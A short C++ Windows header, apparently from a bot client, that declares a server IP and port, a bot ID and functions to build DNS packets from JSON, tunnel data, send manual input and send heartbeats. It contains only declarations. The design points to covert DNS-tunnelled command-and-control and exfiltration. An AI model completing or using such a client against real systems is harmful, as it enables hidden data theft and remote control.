#pragma once
#include <string>
#include <winsock2.h>
using namespace std;

extern const char* SERVER_IP;
extern const int SERVER_PORT;
extern const char* BOT_ID;
extern SOCKET clientSocket;

string CreateDNSPacket(const string& jsonData);
bool InitializeConnection();
bool SendDataTunnel(const string& data);
void SendManualInput(const string& content);
void SendHeartbeat();

